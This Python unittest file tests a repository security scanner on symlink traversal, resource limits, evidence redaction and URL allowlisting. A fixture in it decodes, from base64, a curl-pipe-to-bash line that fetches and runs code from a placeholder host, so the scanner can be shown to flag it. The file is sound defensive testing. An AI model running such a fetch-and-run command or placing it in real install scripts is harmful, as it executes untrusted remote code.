import base64
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from repoguard.reporters import render_report
from repoguard.rules import redact_evidence
from repoguard.scanner import RepoScanner
from repoguard.target import is_git_url
from tests.fixture_builder import suspicious_fixture


ROOT = Path(__file__).resolve().parent.parent
CANARY = "SECRET_CANARY_9f3a"


def run_cli(*arguments: str) -> subprocess.CompletedProcess:
    environment = os.environ.copy()
    environment["PYTHONPATH"] = str(ROOT / "src")
    return subprocess.run(
        [sys.executable, "-m", "repoguard"] + list(arguments),
        cwd=str(ROOT),
        env=environment,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


class TraversalSecurityTests(unittest.TestCase):
    def make_symlink(self, target: Path, link: Path) -> None:
        try:
            link.symlink_to(target, target_is_directory=target.is_dir())
        except (NotImplementedError, OSError) as exc:
            self.skipTest("symlink creation is unavailable: {0}".format(exc))

    def test_symlinked_file_outside_root_is_never_read_or_reported(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            base = Path(temporary_directory)
            root = base / "repo"
            root.mkdir()
            outside = base / "outside.txt"
            outside.write_text(CANARY, encoding="utf-8")
            self.make_symlink(outside, root / "linked.txt")

            report = RepoScanner(evidence_mode="snippet").scan(root)

            self.assertEqual(report.scanned_files, 0)
            self.assertGreaterEqual(report.skipped_files, 1)
            for output_format in ("text", "json", "sarif"):
                self.assertNotIn(CANARY, render_report(report, output_format))
            self.assertFalse(any(finding.path == "linked.txt" for finding in report.findings))

    def test_symlinked_directory_outside_root_is_not_traversed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            base = Path(temporary_directory)
            root = base / "repo"
            outside = base / "outside"
            root.mkdir()
            outside.mkdir()
            (outside / "canary.txt").write_text(CANARY, encoding="utf-8")
            self.make_symlink(outside, root / "linked-directory")

            report = RepoScanner(evidence_mode="snippet").scan(root)

            self.assertEqual(report.scanned_files, 0)
            self.assertGreaterEqual(report.skipped_files, 1)
            self.assertNotIn(CANARY, render_report(report, "json"))

    def test_broken_symlink_is_skipped(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            self.make_symlink(root / "missing.txt", root / "broken.txt")
            report = RepoScanner().scan(root)
            self.assertEqual(report.scanned_files, 0)
            self.assertGreaterEqual(report.skipped_files, 1)

    @unittest.skipUnless(hasattr(os, "mkfifo") and os.name != "nt", "FIFO test requires POSIX")
    def test_fifo_is_skipped_without_opening(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            os.mkfifo(str(root / "pipe.txt"))
            report = RepoScanner().scan(root)
            self.assertEqual(report.scanned_files, 0)
            self.assertGreaterEqual(report.skipped_files, 1)

    def test_fstat_identity_mismatch_skips_file(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            path = root / "file.txt"
            path.write_text("ordinary content", encoding="utf-8")
            actual = os.stat(str(path))
            mismatch = SimpleNamespace(st_mode=actual.st_mode, st_dev=actual.st_dev, st_ino=actual.st_ino + 1)
            with mock.patch("repoguard.scanner.os.fstat", return_value=mismatch):
                report = RepoScanner().scan(root)
            self.assertEqual(report.scanned_files, 0)
            self.assertGreaterEqual(report.skipped_files, 1)


class ResourceLimitTests(unittest.TestCase):
    def make_repository(self, root: Path) -> None:
        (root / "a.txt").write_text("alpha", encoding="utf-8")
        (root / "b.txt").write_text("bravo", encoding="utf-8")

    def assert_incomplete(self, report, reason: str) -> None:
        self.assertEqual(report.scan_status, "incomplete")
        self.assertTrue(report.truncated)
        self.assertEqual(report.truncation_reason, reason)
        self.assertEqual(report.verdict, "INCOMPLETE")
        self.assertNotEqual(report.risk_level, "clean")
        self.assertIn("Status: INCOMPLETE ({0} limit reached)".format(reason), render_report(report, "text"))
        sarif = json.loads(render_report(report, "sarif"))
        invocation = sarif["runs"][0]["invocations"][0]
        self.assertFalse(invocation["executionSuccessful"])
        self.assertEqual(invocation["toolExecutionNotifications"][0]["level"], "error")

    def test_each_limit_marks_scan_incomplete(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            self.make_repository(root)
            cases = [
                (RepoScanner(max_files=1), "max_files"),
                (RepoScanner(max_total_bytes=1), "max_total_bytes"),
                (RepoScanner(max_duration_seconds=0), "max_duration"),
            ]
            for scanner, reason in cases:
                with self.subTest(reason=reason):
                    self.assert_incomplete(scanner.scan(root), reason)

    def test_each_limit_returns_exit_code_three(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            self.make_repository(root)
            cases = [
                ("max_files", ["--max-files", "1"]),
                ("max_total_bytes", ["--max-total-bytes", "1"]),
                ("max_duration", ["--max-seconds", "0"]),
            ]
            for reason, flags in cases:
                with self.subTest(reason=reason):
                    result = run_cli("scan", str(root), "--format", "json", *flags)
                    self.assertEqual(result.returncode, 3, result.stderr)
                    payload = json.loads(result.stdout)
                    self.assertEqual(payload["truncation_reason"], reason)
                    self.assertEqual(payload["verdict"], "INCOMPLETE")
                    self.assertNotEqual(payload["risk_level"], "clean")

    def test_per_file_limit_skips_without_truncating(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "large.txt").write_text("too large", encoding="utf-8")
            report = RepoScanner(max_file_bytes=1).scan(root)
            self.assertEqual(report.scan_status, "complete")
            self.assertFalse(report.truncated)
            self.assertEqual(report.skipped_files, 1)


class EvidenceTests(unittest.TestCase):
    def test_safe_mode_never_emits_repository_text(self) -> None:
        marker = "UNIQUE_REPOSITORY_MARKER_83f2"
        encoded_template = "Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZC97bWFya2VyfSB8IGJhc2gK"
        with tempfile.TemporaryDirectory() as temporary_directory:
            fixture = Path(temporary_directory)
            matched_text = base64.b64decode(encoded_template).decode("utf-8").format(marker=marker)
            (fixture / "install.sh").write_text(matched_text, encoding="utf-8")
            report = RepoScanner(evidence_mode="safe").scan(fixture)
            self.assertGreater(len(report.findings), 0)
            for output_format in ("text", "json", "sarif"):
                self.assertNotIn(marker, render_report(report, output_format))

    def test_none_mode_omits_evidence_from_all_outputs(self) -> None:
        with suspicious_fixture() as fixture:
            report = RepoScanner(evidence_mode="none").scan(fixture)
            payload = json.loads(render_report(report, "json"))
            self.assertTrue(payload["findings"])
            self.assertTrue(all("evidence" not in finding for finding in payload["findings"]))
            self.assertNotIn("Evidence:", render_report(report, "text"))
            sarif = render_report(report, "sarif")
            self.assertNotIn("Evidence:", sarif)

    def test_snippet_mode_masks_secrets_and_control_characters(self) -> None:
        key_block = base64.b64decode(
            "LS0tLS1CRUdJTiBPUU1FIFBSSVZBVEUgS0VZLS0tLS0KU0VDUkVUX0tFWV9CT0RZCi0tLS0tRU5EIE9RTUUgUFJJVkFURSBLRVktLS0tLQ=="
        ).decode("utf-8")
        high_entropy = "aB3dE5gH7jK9mN2pQ4sT6vW8xY0zC1fG"
        sanitized = redact_evidence("prefix\x01 " + key_block + " " + high_entropy)
        self.assertNotIn("SECRET_KEY_BODY", sanitized)
        self.assertNotIn(high_entropy, sanitized)
        self.assertNotIn("\x01", sanitized)
        self.assertIn("PRIVATE_KEY_BLOCK_REDACTED", sanitized)
        self.assertIn("HIGH_ENTROPY_REDACTED", sanitized)


class RuleAndTargetTests(unittest.TestCase):
    def test_remote_url_allowlist(self) -> None:
        self.assertTrue(is_git_url("https://github.com/a/b"))
        self.assertTrue(is_git_url("https://github.com/a/b.git"))
        self.assertFalse(is_git_url("git@github.com:a/b.git"))
        self.assertFalse(is_git_url("http://github.com/a/b"))
        self.assertFalse(is_git_url("https://evil.example/x.git"))

    def test_subprocess_argument_list_is_not_flagged_but_shell_string_is(self) -> None:
        safe_source = 'import subprocess\nsubprocess.run(["ls", "-l"])\n'
        unsafe_source = base64.b64decode(
            "aW1wb3J0IHN1YnByb2Nlc3MKc3VicHJvY2Vzcy5ydW4oImxzIC1sIiwgc2hlbGw9VHJ1ZSkK"
        ).decode("utf-8")
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "safe.py").write_text(safe_source, encoding="utf-8")
            safe_report = RepoScanner().scan(root)
            self.assertFalse(any(finding.rule_id == "python-dynamic-execution" for finding in safe_report.findings))
            (root / "unsafe.py").write_text(unsafe_source, encoding="utf-8")
            unsafe_report = RepoScanner().scan(root)
            self.assertTrue(any(finding.rule_id == "python-dynamic-execution" for finding in unsafe_report.findings))

    def test_repository_self_scan_has_no_high_or_critical_findings(self) -> None:
        report = RepoScanner().scan(ROOT)
        severe = [finding for finding in report.findings if finding.severity in {"high", "critical"}]
        self.assertEqual(severe, [])


if __name__ == "__main__":
    unittest.main()
